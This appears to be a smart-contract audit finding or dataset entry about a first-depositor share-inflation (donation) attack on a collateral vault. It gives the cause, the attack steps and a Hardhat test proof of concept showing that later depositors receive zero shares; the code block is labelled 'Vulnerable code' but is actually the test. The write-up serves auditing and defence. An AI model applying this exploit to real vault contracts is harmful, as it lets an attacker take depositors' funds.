Type of vulnerability: Initial Value Manipulation (Front-running)
Cause of vulnerability: The first depositor can manipulate the share price by making a small initial deposit and then transferring a large amount of assets to inflate the share price, preventing subsequent depositors from receiving shares.
Execution process: 
1. Attacker deposits a small amount (2 wei) to mint 1 share.
2. Attacker transfers a large amount (1M tokens) to the strategy controller to inflate the share price.
3. Subsequent depositors, attempting to deposit reasonable amounts, receive 0 shares due to the inflated share price.
Vulnerable code: 
```solidity
it("will cause 0 share issuance", async () => {
    // 1. first user deposits 2 wei because 1 wei will be deducted for fee
    let firstDepositAmount = ethers.BigNumber.from(2);
    await transferAndApproveForDeposit(user, collateral.address, firstDepositAmount);
    await collateral.connect(user).deposit(firstDepositAmount);
    // 2. do huge transfer of 1M to strategy to controller
    // to greatly inflate share price
    await baseToken.transfer(strategyController.address, ethers.utils.parseEther("1000000"));
    // 3. deployer tries to deposit reasonable amount of 10_000
    let subsequentDepositAmount = ethers.utils.parseEther("10000");
    await transferAndApproveForDeposit(deployer, collateral.address, subsequentDepositAmount);
    await collateral.connect(deployer).deposit(subsequentDepositAmount);
    // receives 0 shares in return
    expect(await collateral.balanceOf(deployer.address)).to.be.eq(0);
});
```
